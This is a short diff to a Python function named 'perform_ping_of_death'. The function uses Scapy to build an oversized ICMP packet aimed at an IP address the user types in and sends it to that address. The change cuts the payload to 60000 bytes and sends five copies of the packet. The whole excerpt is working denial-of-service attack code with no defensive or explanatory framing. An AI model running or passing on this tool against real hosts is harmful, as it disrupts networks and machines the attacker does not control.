@@ -428,9 +428,9 @@ def perform_ping_of_death(ip_addr=None):
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
-    packet = IP(dst=ip_addr) / ICMP() / ("X" * 65508)
+    packet = IP(dst=ip_addr) / ICMP() / ("X" * 60000)
 
-    send(packet)
+    send(5 * packet)
 
     return "Ping of death attack performed on " + ip_addr
 
